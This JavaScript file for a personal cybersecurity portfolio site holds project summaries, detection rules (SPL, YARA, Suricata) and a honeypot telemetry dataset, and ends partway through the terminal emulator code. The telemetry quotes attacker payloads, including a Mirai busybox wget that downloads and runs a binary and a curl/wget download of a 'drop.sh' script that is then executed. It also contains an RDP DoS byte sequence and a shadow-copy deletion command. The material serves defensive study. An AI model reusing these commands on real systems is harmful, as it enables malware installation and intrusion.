/**
 * Devanshu Grover — Cybersecurity & Security Operations Portfolio
 * Interactive Functionality & Real Telemetry Datasets
 */

/* ═══════════════════════════════════════
   1. ENRICHED PROJECT DATASET
   ═══════════════════════════════════════ */
const projectData = {
  'splunk-soc-incident-investigation': {
    id: 'splunk-soc-incident-investigation',
    badge: 'ENTERPRISE IR // NIST SP 800-61',
    category: '02 · ENTERPRISE SIEM & THREAT HUNTING',
    name: 'Splunk SIEM Incident Investigation & SOC Threat Hunting: Operation BlackByte',
    summary: 'Conducted end-to-end incident response and threat hunting in Splunk Enterprise reconstructing an enterprise ransomware and data exfiltration intrusion against Apex Global Financial.',
    description: 'Reconstructed an advanced persistent financial breach (Operation BlackByte). Triaged multi-source enterprise telemetry (Windows Security Event Logs, Sysmon XML, and Zeek network streams) across 7 attack phases, engineered targeted Splunk SPL correlation searches, authored vendor-agnostic Sigma detection rules, and drafted a formal NIST SP 800-61r2 Incident Response Report.',
    repo: 'https://github.com/Dgrover07/Portfolio_Devanshu/tree/main/splunk-soc-incident-investigation',
    interactiveDashboard: 'splunk-soc-incident-investigation/dashboards/interactive_soc_viewer.html',
    tags: ['Splunk Enterprise', 'Splunk SPL', 'Sysmon XML', 'Sigma Rules', 'NIST SP 800-61r2', 'MITRE ATT&CK', 'Active Directory', 'Zeek / HTTP Stream'],
    points: [
      'Traced Initial Access: Identified weaponized Excel macro (Invoice_Q3_9942.xlsm) downloaded via spearphishing, verified via Sysmon Event ID 15 Zone Identifier.',
      'Uncovered Process Lineage: EXCEL.EXE -> powershell.exe (-nop -w hidden -enc) executing in-memory download cradle fetching stage2.ps1 from C2 server 198.51.100.77.',
      'Correlated Credential Access: Detected LSASS memory dump via rundll32.exe comsvcs.dll (Sysmon Event ID 10 GrantedAccess 0x1010) harvesting APEX\\svc_backup.',
      'Triaged Lateral Movement: Correlated Network Logon (Event ID 4624 Type 3) and PsExec service installation (Event ID 7045) moving to File Server FS-DATA-01 (10.100.10.20).',
      'Tracked Data Exfiltration: Discovered 88.4 MB of financial databases compressed into Finance_2026_Export.7z and uploaded via HTTPS to C2 infrastructure.',
      'Intercepted Anti-Recovery: Caught "vssadmin.exe delete shadows /all /quiet" and coordinated asset containment within 1 hour 45 minutes.'
    ],
    tech: ['Splunk Enterprise', 'Splunk SPL', 'Sysmon (Event 1/3/10/15)', 'Sigma Detection Rules', 'NIST SP 800-61r2', 'MITRE ATT&CK Matrix', 'Zeek Network Streams', 'PowerShell Obfuscation Triage'],
    ruleType: 'SPLUNK SPL CORRELATION SEARCH // LSASS DUMP DETECTOR',
    ruleCode: `index=* sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=10
| search TargetImage="*\\lsass.exe" GrantedAccess IN ("0x1010", "0x1410", "0x143a", "0x1FFFFF", "0x1F3FFF")
| search NOT SourceImage IN ("*\\MsMpEng.exe", "*\\csrss.exe", "*\\svchost.exe")
| eval AlertTitle="Critical: Unauthorized LSASS Process Memory Access (comsvcs / mimikatz)"
| eval RiskScore=95
| table _time, Computer, SourceUser, SourceImage, TargetImage, GrantedAccess, CallTrace, RiskScore`,
    mitreTactics: [
      { id: 'T1566.001', name: 'Spearphishing Attachment (Invoice.xlsm)', phase: 'Initial Access' },
      { id: 'T1059.001', name: 'PowerShell Hidden Encoded Cradle', phase: 'Execution' },
      { id: 'T1562.001', name: 'Impair Defenses (Defender Folder Exclusion)', phase: 'Defense Evasion' },
      { id: 'T1053.005', name: 'Scheduled Task (WindowsAppUpdate)', phase: 'Persistence' },
      { id: 'T1003.001', name: 'LSASS Memory Dump via comsvcs.dll', phase: 'Credential Access' },
      { id: 'T1021.002', name: 'SMB / Admin Shares (PsExec to FS-DATA-01)', phase: 'Lateral Movement' },
      { id: 'T1560.001', name: 'Archive via 7-Zip (Password Protected)', phase: 'Collection' },
      { id: 'T1041', name: 'Exfiltration Over C2 Channel (88.4 MB)', phase: 'Exfiltration' },
      { id: 'T1490', name: 'Inhibit System Recovery (vssadmin delete shadows)', phase: 'Impact' }
    ],
    topology: [
      { step: '01. Infiltration', title: 'Phishing Email', desc: 'Weaponized Invoice_Q3_9942.xlsm delivered to FIN-WS-014 (jdoe)' },
      { step: '02. Execution', title: 'PowerShell Cradle', desc: 'Hidden encoded cradle pulling stage2.ps1 from 198.51.100.77' },
      { step: '03. Credential Dump', title: 'LSASS Dump (comsvcs)', desc: 'rundll32 comsvcs.dll dumps LSASS harvesting svc_backup' },
      { step: '04. Lateral Pivot', title: 'PsExec to FS-DATA-01', desc: 'SMB network logon & PsExec service install on File Server' },
      { step: '05. Exfil & Defense', title: '88.4MB Upload & VSS', desc: '7z staging exfiltration; SOC containment halts ransomware' }
    ],
    takeaways: [
      'LSA Protection (Credential Guard) is a mandatory enterprise control: enabling RunAsPPL blocks unprivileged user-space dumps of lsass.exe even if local admin rights are compromised.',
      'Attack Surface Reduction (ASR) rule "Block Office applications from creating child processes" entirely neutralizes macro-based execution vectors before PowerShell ever launches.',
      'Privileged service accounts (like backup daemons) must be restricted to Log on as a Batch Job only and blocked from interactive/network logons across end-user workstations.',
      'Correlating endpoint Sysmon telemetry with perimeter network streams (Zeek/Suricata) enables rapid root-cause timeline construction during P1 enterprise incidents.'
    ]
  },

  'phishing-osint': {
    id: 'phishing-osint',
    badge: 'ANALYSIS',
    category: '03 · THREAT INVESTIGATION & OSINT',
    name: 'Phishing Email Investigation & OSINT',
    summary: 'Executed structured header, domain, payload, and attachment triage on suspicious emails to identify credential harvesters, spoofing, and malware staging infrastructure.',
    description: 'Conducted end-to-end forensic triage on suspicious inbound email samples reported in a simulated enterprise inbox. Evaluated email authentication alignment (SPF/DKIM/DMARC), inspected MIME structures, extracted nested redirection links, and conducted OSINT on malicious domain staging infrastructure.',
    repo: 'https://github.com/Dgrover07/Phishing-OSINT-Investigation',
    tags: ['VirusTotal', 'URLScan.io', 'CyberChef', 'MXToolbox', 'WHOIS', 'Header Triage'],
    points: [
      'Analyzed raw RFC 5322 email headers, verifying Received hop authenticity, Return-Path discrepancies, and DMARC enforcement failures.',
      'Defanged and decoded obfuscated JavaScript and base64-encoded redirect payloads using CyberChef.',
      'Cross-referenced domain registrant history, DNS MX records, and SSL certificate fingerprints with VirusTotal and URLScan.io sandbox telemetry.',
      'Created standard SOC phishing incident tickets with risk ratings, Indicators of Compromise (SHA-256 hashes, C2 domains), and defensive mail-flow recommendations.'
    ],
    tech: ['Email Header Analysis', 'CyberChef', 'VirusTotal', 'URLScan.io', 'MXToolbox', 'WHOIS', 'Defanging Scripts'],
    ruleType: 'EMAIL GATEWAY CONTENT FILTER / YARA LOGIC',
    ruleCode: `rule Phishing_Credential_Harvester_Redirect {
    meta:
        description = "Detects obfuscated credential harvesting redirect scripts in HTML email attachments"
        author = "Devanshu Grover"
        date = "2025-11-14"
        threat_level = "High"
    strings:
        $s1 = "window.location.replace" ascii nocase
        $s2 = "unescape(atob(" ascii nocase
        $s3 = "input type=\\"password\\"" ascii nocase
        $s4 = "document.getElementById('login-form')" ascii nocase
    condition:
        ($s1 or $s2) and ($s3 or $s4) and (filesize < 50KB)
}`,
    mitreTactics: [
      { id: 'T1566.001', name: 'Spearphishing Attachment', phase: 'Initial Access' },
      { id: 'T1566.002', name: 'Spearphishing Link', phase: 'Initial Access' },
      { id: 'T1556', name: 'Modify Authentication Process', phase: 'Credential Access' }
    ],
    topology: [
      { step: '01. Inbound Vector', title: 'Suspicious Email', desc: 'Reported malicious phishing email with obfuscated attachments' },
      { step: '02. Header Triage', title: 'MIME & Authentication', desc: 'RFC 5322 header inspection, Received hops, SPF/DKIM/DMARC' },
      { step: '03. Deobfuscation', title: 'CyberChef Recipe', desc: 'Base64 decoding, URL defanging & script deobfuscation' },
      { step: '04. Threat Intel', title: 'OSINT Sandboxes', desc: 'Cross-referencing IOC domains via VirusTotal & URLScan.io' },
      { step: '05. Incident Ticket', title: 'SOC Report & Rules', desc: 'Standard IOC ticket, mail rules & YARA signatures' }
    ],
    takeaways: [
      'Attackers heavily utilize legitimate cloud storage services (e.g. OneDrive, SharePoint, Google Forms) to bypass standard domain reputation filters.',
      'Checking SPF pass is insufficient alone; header `From:` display name spoofing requires strict DMARC alignment validation.'
    ]
  },

  'tpot-soc-assessment': {
    id: 'tpot-soc-assessment',
    badge: 'LIVE HONEYPOT // 141 ATTACKS',
    category: '01 · FLAGSHIP SOC & THREAT INTEL',
    name: 'T-Pot Multi-Honeypot SOC Threat Intelligence & Security Engineering Assessment',
    summary: 'Engineered an enterprise-grade multi-honeypot SOC architecture with T-Pot v24.04 and Suricata NIDS on Ubuntu 22.04 LTS, ingesting 141 real attack events into the Elastic Stack (ECS).',
    description: 'Designed and deployed an enterprise multi-honeypot environment running Cowrie, Dionaea, RDPHoneypot, Tanner, and Ciscoasa behind Suricata NIDS. Processed live attack telemetry through the Elastic Common Schema (ECS), mapped threats across the 6-phase SOC threat lifecycle, engineered custom Suricata detection rules, and performed threat actor attribution across 6 autonomous systems.',
    repo: 'https://github.com/Dgrover07/Honey_pot_project',
    tags: ['T-Pot v24.04', 'Suricata NIDS', 'Elastic Stack', 'Sigma Rules', 'MITRE ATT&CK', 'SOC Operations'],
    points: [
      'Deployed T-Pot v24.04 on Ubuntu 22.04 LTS with 6 containerized honeypot daemons and Suricata NIDS capturing 141 live attack sessions.',
      'Normalized heterogeneous telemetry using Logstash pipelines into Elastic Common Schema (ECS) with MaxMind GeoIP enrichment.',
      'Engineered custom Suricata NIDS signatures (SIDs 9000001–9000004) and Sigma YAML rules detecting DoublePulsar (1,601 alerts), Mirai botnet sweeps, and RDP DoS (CVE-2012-0152).',
      'Mapped threat actor infrastructure across 6 Autonomous Systems (AS5089 Virgin Media UK leading with 18 attacks) and mapped techniques across the MITRE ATT&CK matrix.'
    ],
    tech: ['T-Pot v24.04', 'Suricata NIDS', 'Docker', 'Ubuntu 22.04', 'Elasticsearch', 'Kibana', 'Logstash', 'Sigma Rules', 'Python', 'PowerShell', 'MITRE ATT&CK'],
    ruleType: 'CUSTOM SURICATA NIDS SIGNATURE (rules/suricata_custom.rules)',
    ruleCode: `# SID 9000001: DoublePulsar SMB Backdoor Trans2 Secondary Ping
alert tcp any any -> $HOME_NET 445 (
    msg:"SOC-DG-DETECTION: DoublePulsar SMB Backdoor Ping Request";
    flow:to_server,established;
    content:"|ff|SMB"; depth:4; offset:4;
    content:"|32 00|"; distance:5; within:2;
    content:"|23 00|"; distance:12; within:2;
    classtype:trojan-activity;
    sid:9000001;
    rev:1;
)

# SID 9000003: RDP Syn-Reset DoS Exploitation (CVE-2012-0152 / MS12-020)
alert tcp any any -> $HOME_NET 3389 (
    msg:"SOC-DG-DETECTION: Microsoft Remote Desktop Service RDP DoS Attempt";
    flow:to_server,established;
    content:"|03 00 00|"; depth:3;
    content:"|e0 00 00 00 00 00|"; distance:8; within:6;
    reference:cve,2012-0152;
    classtype:attempted-dos;
    sid:9000003;
    rev:1;
)`,
    mitreTactics: [
      { id: 'T1210', name: 'Exploitation of Remote Services (DoublePulsar)', phase: 'Initial Access' },
      { id: 'T1110.001', name: 'Brute Force (SSH & Telnet)', phase: 'Credential Access' },
      { id: 'T1499.002', name: 'OS Exhaustion Flood (RDP DoS)', phase: 'Impact' },
      { id: 'T1595.001', name: 'Active Scanning (Nmap SYN Sweeps)', phase: 'Reconnaissance' }
    ],
    topology: [
      { step: '01. Ingress', title: 'Adversary Probes', desc: 'External botnets & automated scanners targeting open ports' },
      { step: '02. NIDS TAP', title: 'Suricata NIDS', desc: 'Promiscuous packet capture matching Emerging Threats SIDs' },
      { step: '03. Honey Cluster', title: 'Docker Containers', desc: 'Isolated daemons (Cowrie, Dionaea, Tanner, RDPHoneypot, Ciscoasa)' },
      { step: '04. Normalization', title: 'Filebeat & Logstash', desc: 'MaxMind GeoIP/ASN lookup + Elastic Common Schema (ECS)' },
      { step: '05. SIEM & Triage', title: 'Elasticsearch & Kibana', desc: 'Daily index rotation, SOC dashboards & Sigma alert rules' }
    ],
    takeaways: [
      'DoublePulsar (leaked in 2017) remains one of the most heavily probed backdoors on public IPv4, proving legacy vulnerabilities are perpetually scanned by automated threat actors.',
      'Elastic Common Schema (ECS) normalization is essential when aggregating telemetry from disparate sensors (Cowrie, Suricata, Dionaea) into a single Kibana dashboard.',
      'Suricata rules requiring exact byte offsets (depth/within) significantly reduce false-positive rates compared to broad string matching.'
    ]
  }
};

/* ═══════════════════════════════════════
   2. REAL SOC TELEMETRY DATASET
   ═══════════════════════════════════════ */
const socEventsData = [
  {
    id: 'evt-01',
    timestamp: '2026-08-16 04:12:18 UTC',
    vector: 'doublepulsar',
    vectorLabel: 'SMB / DoublePulsar',
    port: 'TCP/445 (SMB)',
    sourceIp: '80.195.138.223',
    asn: 'AS5089 Virgin Media (United Kingdom)',
    country: 'UK',
    severity: 'critical',
    severityLabel: 'CRITICAL',
    title: 'DoublePulsar SMB Kernel Backdoor Probe',
    signature: 'ET EXPLOIT DoublePulsar Backdoor Ping Request [SID: 2024766]',
    payload: 'alert tcp 80.195.138.223 any -> $HOME_NET 445 (msg:"DoublePulsar Ping"; content:"|ff|SMB"; offset:4; depth:4; content:"|23 00|"; sid:2024766;)',
    mitre: 'T1210: Exploitation of Remote Services',
    analystNotes: 'High-frequency automated SMB sweep targeting EternalBlue/DoublePulsar ring-0 kernel implant. Attacker sent SMB Trans2 request opcode 0x23 to confirm backdoor presence.',
    mitigation: 'Block TCP port 445 at edge firewall. Disable SMBv1, enforce SMBv2/SMBv3 with packet signing, and verify MS17-010 security patch installation.'
  },
  {
    id: 'evt-02',
    timestamp: '2026-08-16 05:28:44 UTC',
    vector: 'ssh',
    vectorLabel: 'SSH / Cowrie',
    port: 'TCP/22 (SSH)',
    sourceIp: '185.241.208.245',
    asn: 'AS210558 1337 Services GmbH (Germany)',
    country: 'DE',
    severity: 'high',
    severityLabel: 'HIGH',
    title: 'Cowrie SSH High-Frequency Dictionary Attack',
    signature: 'COWRIE_AUTH_FAILED: user=root, pass=123456, attempts=18/min',
    payload: 'SSH-2.0-libssh2_1.9.0 | Auth: [root:123456], [admin:admin], [support:support] -> Connection Dropped',
    mitre: 'T1110.001: Password Guessing',
    analystNotes: 'Automated brute-force botnet testing common administrative credentials against OpenSSH daemon. Rapid succession within a 60-second window.',
    mitigation: 'Disable SSH password authentication entirely; mandate Ed25519 public key auth. Deploy Fail2ban to block IPs exceeding 5 failed attempts in 60s.'
  },
  {
    id: 'evt-03',
    timestamp: '2026-08-16 06:14:02 UTC',
    vector: 'telnet',
    vectorLabel: 'Telnet / Mirai',
    port: 'TCP/23 (Telnet)',
    sourceIp: '193.140.142.9',
    asn: 'AS8517 Academic Network (Turkey)',
    country: 'TR',
    severity: 'high',
    severityLabel: 'HIGH',
    title: 'Mirai / Qbot IoT Botnet Telnet Ingress',
    signature: 'TELNET_PROBE: Attempted command injection [/bin/busybox WGET]',
    payload: 'USER: admin | PASS: 1234 | CMD: /bin/busybox wget http://193.140.142.9/bins/mirai.arm7 -O /tmp/m && chmod +x /tmp/m && /tmp/m',
    mitre: 'T1059.004: Unix Shell Execution',
    analystNotes: 'Classic Mirai botnet propagation loop. Successful connection attempt immediately attempts to drop a second-stage ELF binary payload into /tmp.',
    mitigation: 'Completely disable legacy unencrypted Telnet (port 23). Restrict remote management to SSH on non-default ports behind VPN or bastion hosts.'
  },
  {
    id: 'evt-04',
    timestamp: '2026-08-16 07:05:19 UTC',
    vector: 'rdp',
    vectorLabel: 'RDP / CVE-2012-0152',
    port: 'TCP/3389 (RDP)',
    sourceIp: '81.214.142.193',
    asn: 'AS9121 Turk Telekom (Turkey)',
    country: 'TR',
    severity: 'high',
    severityLabel: 'HIGH',
    title: 'RDP Syn-Reset Denial-of-Service Exploit Attempt',
    signature: 'ET EXPLOIT Microsoft Remote Desktop Service RDP DoS Attempt (MS12-020 / CVE-2012-0152)',
    payload: 'TCP [SYN, RST] Payload: |03 00 00 13 0e e0 00 00 00 00 00 01 00 08 00 00 00 00 00| -> Remote Desktop crash trigger',
    mitre: 'T1499.002: OS Exhaustion Flood',
    analystNotes: 'Malformed RDP packet crafted to exploit legacy MS12-020 vulnerability in Remote Desktop protocol handling, designed to cause a kernel BSOD/crash.',
    mitigation: 'Apply MS12-020 security patch. Require Network Level Authentication (NLA) on RDP and place RDP access strictly behind Zero-Trust / WireGuard VPN.'
  },
  {
    id: 'evt-05',
    timestamp: '2026-08-16 08:33:50 UTC',
    vector: 'web',
    vectorLabel: 'Web / Recon',
    port: 'TCP/443 (HTTPS)',
    sourceIp: '45.154.255.89',
    asn: 'AS200052 Datacamp Limited (UK)',
    country: 'UK',
    severity: 'medium',
    severityLabel: 'MEDIUM',
    title: 'Web Application Directory Traversal & CMS Recon',
    signature: 'HTTP_URI_SCAN: GET /wp-admin/setup-config.php | GET /.env | GET /phpmyadmin',
    payload: 'GET /wp-admin/setup-config.php HTTP/1.1\\r\\nHost: honey-target.lab\\r\\nUser-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine)\\r\\n\\r\\n',
    mitre: 'T1595.002: Vulnerability Scanning',
    analystNotes: 'Automated web vulnerability scanner enumerating exposed configuration files, database credentials, and unconfigured WordPress setup files.',
    mitigation: 'Implement Web Application Firewall (WAF) rate limiting, disable directory listings, and block requests with scanner User-Agent signatures.'
  },
  {
    id: 'evt-06',
    timestamp: '2026-08-16 09:18:11 UTC',
    vector: 'doublepulsar',
    vectorLabel: 'SMB / EternalBlue',
    port: 'TCP/445 (SMB)',
    sourceIp: '187.132.237.112',
    asn: 'AS8151 UNINET (Mexico)',
    country: 'MX',
    severity: 'critical',
    severityLabel: 'CRITICAL',
    title: 'Dionaea SMB EternalBlue MS17-010 Exploitation Sweep',
    signature: 'ET EXPLOIT Microsoft Windows SMB Remote Code Execution (MS17-010 / EternalBlue)',
    payload: 'SMB Tree Connect AndX Request: \\\\187.132.237.112\\IPC$ | Malformed SMB_COM_TRANSACTION2 buffer overflow attempt',
    mitre: 'T1210: Exploitation of Remote Services',
    analystNotes: 'Attempted kernel-level remote code execution via SMBv1 buffer overflow in srv.sys. Dionaea safely trapped the shellcode payload without execution.',
    mitigation: 'Ensure MS17-010 update is deployed across all Windows hosts and disable SMBv1 feature globally via Group Policy / PowerShell.'
  },
  {
    id: 'evt-07',
    timestamp: '2026-08-16 10:45:22 UTC',
    vector: 'ssh',
    vectorLabel: 'SSH / Command Injection',
    port: 'TCP/22 (SSH)',
    sourceIp: '185.220.101.5',
    asn: 'AS208294 Tor Exit Node (Netherlands)',
    country: 'NL',
    severity: 'critical',
    severityLabel: 'CRITICAL',
    title: 'Cowrie Interactive Shell Spawn & Malware Stager',
    signature: 'COWRIE_EXEC_MALWARE: curl -s http://malicious.cc/drop.sh | sh',
    payload: 'CMD: cd /tmp && (curl -s http://malicious.cc/drop.sh || wget http://malicious.cc/drop.sh) && chmod 777 drop.sh && ./drop.sh',
    mitre: 'T1105: Ingress Tool Transfer',
    analystNotes: 'Attacker obtained simulated shell and attempted multi-stage shell script download from external C2. Binary SHA256 was extracted and submitted for sandbox triage.',
    mitigation: 'Block outbound egress from servers to unknown external IPs on non-standard ports. Restrict write permissions on /tmp and mount with noexec.'
  },
  {
    id: 'evt-08',
    timestamp: '2026-08-16 11:59:30 UTC',
    vector: 'web',
    vectorLabel: 'Nmap / Stealth Scan',
    port: 'TCP/Multiple',
    sourceIp: '198.51.100.44',
    asn: 'AS16509 Amazon.com (US)',
    country: 'US',
    severity: 'low',
    severityLabel: 'INFO',
    title: 'Nmap SYN Stealth Port Scan (WinSize 1024)',
    signature: 'ET SCAN Nmap SYN Scan Signature [SID: 2009582]',
    payload: 'TCP [SYN] WinSize=1024, MSS=1460, SACK Permitted -> Probing Ports 21, 22, 23, 25, 80, 443, 445, 3389, 8080',
    mitre: 'T1595.001: Active Port Scanning',
    analystNotes: 'Pre-attack reconnaissance sweep mapping open TCP services. Suricata flagged signature WinSize 1024 typical of standard Nmap SYN scan flags.',
    mitigation: 'Implement port-scan detection on border firewall (e.g. psad) to drop IPs executing rapid SYN sweeps across >10 ports.'
  }
];

/* ═══════════════════════════════════════
   3. TOAST NOTIFICATION ENGINE
   ═══════════════════════════════════════ */
function showToast(message, type = 'info') {
  const container = document.getElementById('toast-container');
  if (!container) return;

  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  toast.innerHTML = `
    <span class="toast-icon">${type === 'success' ? '✓' : type === 'error' ? '✕' : 'ℹ'}</span>
    <span class="toast-msg">${message}</span>
  `;
  container.appendChild(toast);

  // Trigger animation
  requestAnimationFrame(() => toast.classList.add('visible'));

  // Remove after 3.2s
  setTimeout(() => {
    toast.classList.remove('visible');
    setTimeout(() => toast.remove(), 300);
  }, 3200);
}

/* ═══════════════════════════════════════
   4. CLIPBOARD COPY UTILITIES
   ═══════════════════════════════════════ */
async function copyToClipboard(text, successMsg) {
  try {
    if (navigator.clipboard && window.isSecureContext) {
      await navigator.clipboard.writeText(text);
    } else {
      const textArea = document.createElement('textarea');
      textArea.value = text;
      textArea.style.position = 'fixed';
      textArea.style.opacity = '0';
      document.body.appendChild(textArea);
      textArea.focus();
      textArea.select();
      document.execCommand('copy');
      textArea.remove();
    }
    showToast(successMsg, 'success');
  } catch (err) {
    showToast('Failed to copy to clipboard', 'error');
  }
}

/* ═══════════════════════════════════════
   5. INTERACTIVE TERMINAL EMULATOR
   ═══════════════════════════════════════ */
function setupTerminal() {
  const termOutput = document.getElementById('term-output');
  const termInput = document.getElementById('term-input');
  const termChips = document.getElementById('term-chips');
  const termForm = document.getElementById('term-form');
  if (!termOutput || !termInput) return;

  const commandHistory = [];
  let historyIndex = -1;

  const commands = {
    help: () => `
<div class="term-res">
  <p class="term-title-cyan">Available Analyst Commands:</p>
  <table class="term-table">
    <tr><td><b class="cmd-cyan">whoami</b></td><td>Display credentials, education and summary bio</td></tr>
    <tr><td><b class="cmd-cyan">projects</b></td><td>List hands-on security labs with quick links</td></tr>
    <tr><td><b class="cmd-cyan">skills</b></td><td>Show technical competencies & toolsets</td></tr>
    <tr><td><b class="cmd-cyan">soc</b> / <b class="cmd-cyan">telemetry</b></td><td>View real honeypot threat statistics</td></tr>
    <tr><td><b class="cmd-cyan">playbook</b></td><td>Launch interactive SOC incident containment chamber</td></tr>
    <tr><td><b class="cmd-cyan">cv</b> / <b class="cmd-cyan">resume</b></td><td>Open Devanshu's print-ready Cybersecurity CV</td></tr>
    <tr><td><b class="cmd-cyan">certs</b></td><td>List official AWS & in-progress certifications</td></tr>
    <tr><td><b class="cmd-cyan">cat notes.txt</b></td><td>Read Devanshu's candid lab engineering notes</td></tr>
    <tr><td><b class="cmd-cyan">cat about.txt</b></td><td>Read full about section overview</td></tr>
    <tr><td><b class="cmd-cyan">contact</b></td><td>Display direct email, phone and social links</td></tr>
    <tr><td><b class="cmd-cyan">clear</b></td><td>Clear the terminal screen</td></tr>
  </table>
</div>`,

    whoami: () => `
<div class="term-res">
  <p><b class="term-highlight">Devanshu Grover</b> — MSc Cybersecurity (2025)</p>
  <p>Location: Cheltenham, Gloucestershire, United Kingdom</p>
  <p>Certifications: AWS Certified Cloud Practitioner | CompTIA Security+ (Studying)</p>
  <p>Experience: 2+ years across IT Tier 1/2 Support, Freelance Delivery (50+ clients), Operations & Retail</p>
  <p>Primary Focus: SIEM Monitoring, Detection Engineering, Incident Triage & Honeypot Telemetry</p>
</div>`,

    projects: () => `
<div class="term-res">
  <p class="term-title-cyan">Hands-On Security Projects:</p>
  <ol class="term-list">
    <li><a href="#projects" class="term-link">[01] T-Pot Multi-Honeypot SOC Assessment</a> — Suricata NIDS, Elastic ECS, 141 Attacks</li>
    <li><a href="#projects" class="term-link">[02] Splunk Enterprise IR (Operation BlackByte)</a> — Splunk SPL, Sysmon 1/10/15, NIST SP 800-61</li>
    <li><a href="#projects" class="term-link">[03] Home SIEM & Windows Monitoring Lab</a> — Splunk, Sysmon XML, Kali Linux</li>
    <li><a href="#projects" class="term-link">[04] Phishing Email Investigation & OSINT</a> — Header Triage, CyberChef, VirusTotal</li>
  </ol>
  <p class="term-dim">Click any project above or scroll down to the Projects section to inspect.</p>
</div>`,

    splunk: () => `
<div class="term-res">
  <p class="term-title-cyan">Splunk Enterprise Incident Investigation (Operation BlackByte):</p>
  <p>● Target: Apex Global Financial (apex-fin.corp) | Severity: <b class="term-highlight">CRITICAL P1</b></p>
  <p>● Attack Vector: Weaponized Excel Macro (Invoice_Q3_9942.xlsm) -> Hidden PowerShell Cradle</p>
  <p>● Credential Dumping: rundll32.exe comsvcs.dll dumping LSASS memory (Sysmon Event ID 10)</p>
  <p>● Lateral Movement: PsExec service installation on File Server FS-DATA-01 (10.100.10.20)</p>
  <p>● Exfiltration: 88.4 MB encrypted 7z archive via HTTPS C2 channel to 198.51.100.77</p>
  <p class="term-dim">Type <b class="cmd-cyan">projects</b> or inspect the case study modal for full SPL queries!</p>
</div>`,

    skills: () => `
<div class="term-res">
  <p class="term-title-cyan">Core Technical Competencies:</p>
  <p><b>SIEM & SOC:</b> Splunk, Sysmon, Suricata NIDS, Elastic Stack, Log Triage, IOC Extraction</p>
  <p><b>Systems:</b> Windows 10/11 Event Logs, Ubuntu Linux, Kali, VirtualBox, VMware</p>
  <p><b>Networking:</b> Wireshark, TCP/IP, DNS, HTTP/S, Nmap, Netstat, UFW Firewalls</p>
  <p><b>Cloud & Scripting:</b> AWS EC2/IAM/CloudWatch, Python, Bash, Sigma Rules, SPL, Git</p>
  <p><b>Frameworks:</b> MITRE ATT&CK Matrix, OWASP Top 10, Defense-in-Depth, GDPR</p>
</div>`,

    soc: () => `
<div class="term-res">
  <p class="term-title-cyan">T-Pot Honeypot & NIDS Capture Summary:</p>
  <p>● Total Captured Attack Sessions: <b class="term-highlight">141 Events</b> (12.2 avg daily rate)</p>
  <p>● DoublePulsar NSA Backdoor Alerts: <b class="term-highlight">1,601 Alerts</b> (Port 445 / SID 2024766)</p>
  <p>● Unique Threat Actors: <b class="term-highlight">57 Attackers</b> across 6 Autonomous Systems</p>
  <p>● Top Source ASN: <b class="term-highlight">AS5089 Virgin Media UK</b> (18 attacks)</p>
  <p class="term-dim">Jump to the Live SOC Telemetry Investigator below to inspect full raw logs!</p>
</div>`,

    telemetry: () => commands.soc(),

    playbook: () => {
      setTimeout(() => window.openPlaybookModal?.(), 300);
      return `<div class="term-res"><p class="term-title-cyan">🚨 Launching SOC Incident Containment Playbook Chamber...</p></div>`;
    },

    cv: () => {
      setTimeout(() => window.openResumeModal?.(), 300);
      return `<div class="term-res"><p class="term-title-cyan">📄 Opening Devanshu's Cybersecurity CV / Resume...</p></div>`;
    },

    resume: () => commands.cv(),

    certs: () => `
<div class="term-res">
  <p class="term-title-cyan">Certifications & Learning Pathways:</p>
  <p>✓ <b class="term-highlight">AWS Certified Cloud Practitioner</b> (Amazon Web Services)</p>
  <p>⏳ <b class="term-highlight">CompTIA Security+ SY0-701</b> (Active study · Target 2026)</p>
  <p>● <b class="term-highlight">TryHackMe SOC Level 1</b> (Completed modules in SIEM, Wireshark & Incident Triage)</p>
  <p>● <b class="term-highlight">Hack The Box</b> (Active practical endpoint and network defense labs)</p>
</div>`,

    'cat notes.txt': () => `
<div class="term-res">
  <p class="term-title-cyan">Devanshu's Personal Lab Notes [notes.txt]:</p>
  <p class="term-dim">"The biggest lesson from running honeypots and SIEMs is that alert volume is easy to generate, but high-fidelity context is everything.</p>
  <p class="term-dim">Default Windows event logging misses process parent-child links; adding Sysmon Event ID 1 transforms triage. And seeing 1,600+ DoublePulsar hits within days proved that legacy CVEs never die—adversaries scan continuously. Defense is about consistency, logging what matters, and clear remediation."</p>
</div>`,

    'notes.txt': () => commands['cat notes.txt'](),

    'cat about.txt': () => commands.whoami(),

    contact: () => `
<div class="term-res">
  <p class="term-title-cyan">Direct Contact Details:</p>
  <p>Email: <a href="mailto:groverdevanshu623@gmail.com" class="term-link">groverdevanshu623@gmail.com</a></p>
  <p>Phone: <a href="tel:+447586395777" class="term-link">+44 7586 395777</a></p>
  <p>LinkedIn: <a href="https://www.linkedin.com/in/devanshugrover-22b097208" target="_blank" class="term-link">linkedin.com/in/devanshugrover-22b097208 ↗</a></p>
  <p>GitHub: <a href="https://github.com/Dgrover07" target="_blank" class="term-link">github.com/Dgrover07 ↗</a></p>
</div>`,

    clear: () => {
      termOutput.innerHTML = '';
      return '';
    },

    sudo: () => `<div class="term-res"><p class="term-warn">Permission denied: devanshu is not in the sudoers file. This incident will be reported to HR 😉</p></div>`,
    matrix: () => `
<div class="term-res">
  <p class="term-matrix">01000100 01000111 01011111 01010011 01001111 01000011</p>
  <p class="term-matrix">Wake up, analyst... The SOC has you.</p>
  <p class="term-matrix">Follow the white rabbit → <a href="#projects" class="term-link">#projects</a></p>
</div>`
  };

  function executeCommand(rawCmd) {
    const cleanCmd = rawCmd.trim().toLowerCase();
    if (!cleanCmd) return;

    commandHistory.push(rawCmd);
    historyIndex = commandHistory.length;

    // Append user input line
    const cmdLine = document.createElement('div');
    cmdLine.className = 'term-cmd-entry';
    cmdLine.innerHTML = `<p class="term-input-echo"><b>$</b> ${escapeHtml(rawCmd)}</p>`;
    termOutput.appendChild(cmdLine);

    // Check command
    if (cleanCmd === 'clear') {
      commands.clear();
    } else if (commands[cleanCmd]) {
      const responseEl = document.createElement('div');
      responseEl.innerHTML = commands[cleanCmd]();
      termOutput.appendChild(responseEl);
    } else {
      const errorEl = document.createElement('div');
      errorEl.className = 'term-res';
      errorEl.innerHTML = `<p class="term-error">Command not recognized: '${escapeHtml(cleanCmd)}'. Type <b class="cmd-cyan">help</b> for available commands.</p>`;
      termOutput.appendChild(errorEl);
    }

    // Autoscroll terminal
